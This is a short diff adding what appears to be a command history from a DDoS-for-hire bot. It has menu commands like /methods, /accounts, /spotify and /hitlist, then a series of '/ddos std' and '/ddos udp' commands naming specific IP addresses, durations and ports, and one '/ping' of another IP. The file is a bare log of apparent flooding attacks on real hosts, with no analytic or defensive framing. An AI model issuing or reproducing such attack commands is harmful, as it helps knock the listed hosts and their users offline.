@@ -1,0 +1,25 @@
+/tr4p
+/accounts
+/methods
+/bugbouty
+/bugbounty
+/hitlist
+/methods
+/accounts
+/vpn
+/accounts
+/spotify
+/ddos std 20.191.53.220 30!=dport 30020
+/ddos std 20.191.53.220 30 =dport 30020
+/ddos std 20.191.53.120 30 dport=20.191.53.200
+/ddos std 51.104.178.222 30 dport=30222
+/ddos std 51.104.178.222 60 dport=30222
+/ddos std 20.50.189.142 60 dport=30217
+/ddos std 20.50.189.142 60 dport=30217
+/ddos std 20.50.189.142 60 dport=30217
+/methods
+/ddos std 51.104.191.98 60 dport=30024
+/ping 71.208.68.168
+/ddos std 51.104.184.8 60 dport=30223
+/ddos udp 51.104.191.46 60 dport=30143
+/ddos std 51.104.191.46 60 dport=30143
